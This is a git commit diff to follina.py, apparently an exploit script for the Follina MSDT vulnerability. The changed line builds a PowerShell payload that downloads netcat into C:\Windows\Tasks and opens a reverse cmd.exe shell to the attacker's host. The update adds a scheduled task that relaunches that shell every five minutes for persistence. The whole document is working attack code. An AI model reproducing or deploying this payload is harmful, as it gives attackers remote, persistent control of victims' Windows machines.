fd2aa6667898bf991c3e79e43a7dbd7bed469f0f
Darwinpz <dpilaloazea@gmail.com>
2023-10-09 15:43:44 -0500

    Update follina.py

--- follina.py
+++ follina.py
@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe ; echo 'Set WshShell = CreateObject("WScript.Shell"): WshShell.Run "C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}", 0, false: Set WshShell = Nothing' > C:\\Windows\\Tasks\\script.txt ; ren C:\\Windows\\Tasks\\script.txt C:\\Windows\\Tasks\\script.vbs ; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe ; echo 'Set WshShell = CreateObject("WScript.Shell"): WshShell.Run "C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}", 0, false: Set WshShell = Nothing' > C:\\Windows\\Tasks\\script.txt ; ren C:\\Windows\\Tasks\\script.txt C:\\Windows\\Tasks\\scriptfollina.vbs ; schtasks /create /tn "tfollina" /tr "C:\\Windows\\Tasks\\scriptfollina.vbs" /sc minute /mo 5 ; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
             
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
